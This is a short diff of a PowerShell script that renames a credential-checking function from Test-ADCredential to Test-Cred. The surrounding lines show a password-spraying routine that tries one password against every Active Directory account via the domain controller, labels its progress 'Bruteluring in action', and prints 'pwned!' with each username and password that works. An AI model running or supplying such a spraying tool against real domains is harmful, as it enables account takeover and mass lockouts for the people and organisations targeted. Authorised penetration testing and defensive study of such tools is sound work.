@@ -1,4 +1,4 @@
-Function Test-ADCredential
+Function Test-Cred
 {
 		Param($username, $password, $domain)
 		Add-Type -AssemblyName System.DirectoryServices.AccountManagement
@@ -96,7 +96,7 @@ write-host ""
 foreach ($user in $users){
     #write-host "Testing" $password "on" $username
     write-progress -Activity "Bruteluring in action. Testing $($user.samaccountname)" -status "$i of $($users.samaccountname.Count) done" -PercentComplete (($i / $users.samaccountname.Count) * 100)
-    $result = Test-ADCredential $user.samaccountname $password $pdc
+    $result = Test-Cred $user.samaccountname $password $pdc
 	if ($result | Where {$_.IsValid -eq $True}){ Write-host "pwned!" $result.username"\"$result.Password }
     #get old badpwdcount
     #$oldpwdcount = $($user | where {$_.samaccountname -eq $user.samaccountname}).badpwdcount
